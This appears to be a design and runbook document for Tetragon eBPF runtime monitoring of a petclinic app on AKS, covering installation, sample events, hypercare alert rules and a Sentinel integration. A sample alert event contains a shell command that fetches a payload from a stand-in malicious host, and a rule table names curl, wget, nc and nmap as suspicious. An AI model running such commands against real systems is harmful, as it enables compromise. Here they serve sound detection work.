# Tetragon Runtime Observability — Design and Operational Use Cases

## What is Tetragon?
Tetragon is an eBPF-based runtime security observability tool from the Cilium project.
It hooks into the Linux kernel using eBPF probes and captures real-time telemetry:
process execution, file access, outbound network connections — at kernel level, not
application level. Unlike traditional APM tools, Tetragon cannot be bypassed by
the application itself.

## Installation (executable commands)

```bash
# Step 1: Add Cilium Helm repo
helm repo add cilium https://helm.cilium.io
helm repo update

# Step 2: Install Tetragon on AKS cluster
helm install tetragon cilium/tetragon \
  --namespace kube-system \
  --set tetragon.exportFilename=/var/run/cilium/tetragon/tetragon.log \
  --set tetragonOperator.enabled=true

# Step 3: Verify daemonset running (one pod per node)
kubectl get pods -n kube-system -l app.kubernetes.io/name=tetragon
kubectl rollout status daemonset/tetragon -n kube-system

# Step 4: Apply TracingPolicy for petclinic namespace
kubectl apply -f kubernetes/network/tetragon-tracingpolicy.yaml

# Step 5: Stream live events (compact format)
kubectl exec -it ds/tetragon -n kube-system -c tetragon \
  -- tetra getevents -o compact

# Step 6: Filter to petclinic namespace only
kubectl exec -it ds/tetragon -n kube-system -c tetragon \
  -- tetra getevents -o compact --namespace petclinic

# Step 7: Save events to file (for SIEM ingestion)
kubectl exec ds/tetragon -n kube-system -c tetragon \
  -- tetra getevents -o json > tetragon_sample_events.json
```

## Sample Tetragon Events

### Process execution event (java app starting — expected)
```json
{
  "process_exec": {
    "process": {
      "pid": 1,
      "binary": "/usr/bin/java",
      "arguments": "-jar app.jar",
      "pod": {"name": "petclinic-7d9f4b-xk2p", "namespace": "petclinic"},
      "uid": 1001
    }
  },
  "time": "2024-11-15T02:30:00Z",
  "node_name": "aks-userpool-001"
}
```

### TCP connection event (DB connection — expected)
```json
{
  "process_kprobe": {
    "process": {
      "binary": "/usr/bin/java",
      "pid": 1,
      "pod": {"name": "petclinic-7d9f4b-xk2p", "namespace": "petclinic"}
    },
    "function_name": "tcp_connect",
    "args": [{"sock_arg": {
      "saddr": "10.1.1.5", "daddr": "10.2.0.4",
      "sport": 52341, "dport": 3306
    }}]
  },
  "time": "2024-11-15T02:30:01Z"
}
```

### ALERT: unexpected shell execution (compromise indicator)
```json
{
  "process_exec": {
    "process": {
      "pid": 8821,
      "binary": "/bin/bash",
      "arguments": "-c wget http://malicious.example.com/payload",
      "parent": {"binary": "/usr/bin/java"},
      "pod": {"name": "petclinic-7d9f4b-xk2p", "namespace": "petclinic"},
      "uid": 1001
    }
  },
  "time": "2024-11-15T03:15:42Z"
}
```
**This event = immediate P1 alert. Java applications never spawn bash shells.**

## Hypercare Monitoring Rules

Based on my experience managing centralised SIEM across 30+ accounts at OCBC Bank,
the following Tetragon event patterns trigger immediate escalation during the
72-hour post-migration hypercare window:

| Rule | Trigger | Severity | Action |
|------|---------|----------|--------|
| Unexpected shell | execve of /bin/sh, /bin/bash, /bin/ash from petclinic pod | P1 | Page security team immediately |
| Unknown egress | TCP connection to IP not in CiliumNetworkPolicy allow list | P1 | Block + investigate |
| Privilege escalation | setuid/setgid syscall from UID 1001 | P1 | Isolate pod + forensics |
| Suspicious binary | curl, wget, nc, nmap executed from app pod | P1 | Page security team |
| High DNS volume | >100 DNS queries/min from single pod | P2 | Investigate — potential DNS tunnelling |
| New process | Any binary executed that is not /usr/bin/java | P2 | Review and classify |

## SIEM Integration

Tetragon events are exported as structured JSON logs and ingested into the
centralised SIEM (Azure Sentinel equivalent) via the log export path.

In my OCBC Bank role, I deployed Azure Sentinel across 30+ accounts. The
Tetragon integration pattern follows the same design: structured event stream
→ Log Analytics Workspace → Sentinel analytics rules → automated response playbooks.

For AKS specifically:
```
Tetragon DaemonSet → /var/log/tetragon/tetragon.log →
Azure Monitor Agent → Log Analytics Workspace →
Sentinel Analytics Rule → Alert → Logic App Playbook →
ServiceNow Incident
```

## How Tetragon Supports Post-Migration Hypercare

1. **Behavioural baseline**: First 4 hours post-cutover, Tetragon establishes
   what "normal" looks like for petclinic — expected processes, expected
   egress destinations, expected connection rates.

2. **Anomaly detection**: Any deviation from the baseline — new binary,
   new egress destination, unexpected shell — surfaces immediately.

3. **Policy tuning**: If CiliumNetworkPolicy is too restrictive and blocks
   legitimate traffic, Tetragon egress events show exactly what destination
   was attempted, making policy fix fast and precise.

4. **Audit trail**: All events are timestamped kernel-level events. For
   MAS TRM incident reporting, Tetragon provides an immutable audit trail
   of exactly what ran and connected to what, for the full hypercare period.

5. **Incident triage**: If a P1 alert fires during hypercare, Tetragon events
   let the on-call engineer see exactly what sequence of events preceded the
   incident — much faster than parsing application logs.
